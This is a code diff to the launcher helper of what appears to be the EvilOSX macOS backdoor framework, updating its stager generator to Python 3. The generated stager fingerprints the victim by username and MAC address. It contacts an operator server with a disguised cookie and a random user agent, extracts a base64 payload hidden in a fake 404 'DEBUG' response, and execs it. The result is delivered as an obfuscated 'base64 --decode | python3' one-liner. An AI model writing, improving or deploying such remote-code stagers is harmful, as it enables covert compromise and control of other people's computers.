@@ -3,7 +3,16 @@
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
-import imp
+try:
+    import imp as _imp_load
+except ImportError:
+    import importlib.util as _importlib
+    def _load_source(name, path):
+        spec = _importlib.spec_from_file_location(name, path)
+        module = _importlib.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        return module
+    _imp_load = type("imp", (), {"load_source": staticmethod(_load_source)})()
 import json
 import random
 import string
@@ -17,13 +26,15 @@ _module_cache = {}
 def get_names():
     """:return: A list of available launchers."""
     launcher_names = []
+    skip = {"__init__.py", "helper.py", "stager_py3.py"}
 
     for filename in listdir(path.realpath(path.dirname(__file__))):
-        if not filename.endswith(".py") or filename in ["__init__.py", "helper.py"]:
+        if not filename.endswith(".py") or filename in skip:
             continue
-        else:
-            launcher_names.append(filename.replace(".py", "", 1))
+        launcher_names.append(filename.replace(".py", "", 1))
 
+    # Prefer python3 first so builder default is modern-macOS-friendly.
+    launcher_names.sort(key=lambda n: (0 if n == "python3" else 1, n))
     return launcher_names
 
 
@@ -34,7 +45,7 @@ def _load_module(module_name):
     """
     # Going to use imp over importlib until python decides to remove it.
     module_path = path.realpath(path.join(path.dirname(__file__), module_name + ".py"))
-    module = imp.load_source(module_name, module_path)
+    module = _imp_load.load_source(module_name, module_path)
 
     _module_cache[module_name] = module
 
@@ -82,50 +93,63 @@ def create_stager(server_host, server_port, loader_options):
     :type server_port: int
     :type loader_options: dict
     :rtype: str
-    :return: The stager which the launcher will execute."""
+    :return: The stager which the launcher will execute.
+    """
     stager_host = "http://{}:{}".format(server_host, server_port)
 
-    # Small piece of code which starts the staging process.
-    # (Runs the loader returned by the server).
-    stager_code = dedent("""\
-    # -*- coding: utf-8 -*-
-    import urllib2
-    from base64 import b64encode, b64decode
-    import getpass
-    from uuid import getnode
-    from binascii import hexlify
+    # Build session cookie payload first (avoid nested dicts inside format strings).
+    session_payload = {
+        "type": 0,
+        "payload_options": {"host": server_host, "port": server_port},
+        "loader_options": loader_options,
+    }
+    session_b64 = b64encode(json.dumps(session_payload).encode()).decode()
+    user_agent = _get_random_user_agent()
+    var_name = get_random_string()
+    var_value = get_random_string(numbers=True)
 
+    # Python 3 stager for modern macOS (no urllib2, no /usr/bin/python).
+    # Keep generated code at column 0 so `base64 | python3` receives valid syntax.
+    nl = chr(10)
+    crnl = chr(13) + chr(10)
+    stager_lines = [
+        "# -*- coding: utf-8 -*-",
+        "import urllib.request as _urlreq",
+        "import urllib.error as _urlerr",
+        "from base64 import b64encode, b64decode",
+        "import getpass",
+        "from uuid import getnode",
+        "from binascii import hexlify",
+        "",
+        "",
+        "def get_uid():",
+        "    return hexlify((getpass.getuser() + '-' + str(getnode())).encode()).decode()",
+        "",
+        "",
+        '{0} = "{1}"'.format(var_name, var_value),
+        "data = {",
+        '    "Cookie": "session=" + b64encode(get_uid().encode()).decode() + "-{0}",'.format(session_b64),
+        '    "User-Agent": "{0}"'.format(user_agent),
+        "}",
+        "",
+        "try:",
+        '    request = _urlreq.Request("{0}", headers=data)'.format(stager_host),
+        "    _urlreq.urlopen(request).read()",
+        "except _urlerr.HTTPError as ex:",
+        "    if ex.code == 404:",
+        "        body = ex.read()",
+        '        marker = b"DEBUG:" + bytes([10])',
+        "        if marker not in body:",
+        '            marker = b"DEBUG:" + bytes([13, 10])',
+        '        chunk = body.split(marker, 1)[1].replace(b"DEBUG-->", b"")',
+        "        exec(b64decode(chunk).decode())",
+        "    else:",
+        "        raise",
+        "",
+    ]
+    stager_code = "\n".join(stager_lines)
 
-    def get_uid():
-        return hexlify(getpass.getuser() + "-" + str(getnode()))
-
-
-    {0} = "{1}"
-    data = {{
-        "Cookie": "session=" + b64encode(get_uid()) + "-{2}",
-        "User-Agent": "{3}"
-    }}
-
-    try:
-        request = urllib2.Request("{4}", headers=data)
-        urllib2.urlopen(request).read()
-    except urllib2.HTTPError as ex:
-        if ex.code == 404:
-            exec(b64decode(ex.read().split("DEBUG:\\n")[1].replace("DEBUG-->", "")))
-        else:
-            raise
-    """.format(
-        get_random_string(), get_random_string(numbers=True),
-        b64encode("{}".format(json.dumps({
-            "type": 0,
-            "payload_options": {"host": server_host, "port": server_port},
-            "loader_options": loader_options
-        })).encode()).decode(),
-        _get_random_user_agent(),
-        stager_host
-    ))
-
-    return "echo {} | base64 --decode | python".format(b64encode(stager_code.encode()).decode())
+    return "printf %s {} | base64 --decode | python3".format(b64encode(stager_code.encode()).decode())
 
 
 def generate(launcher_name, stager):
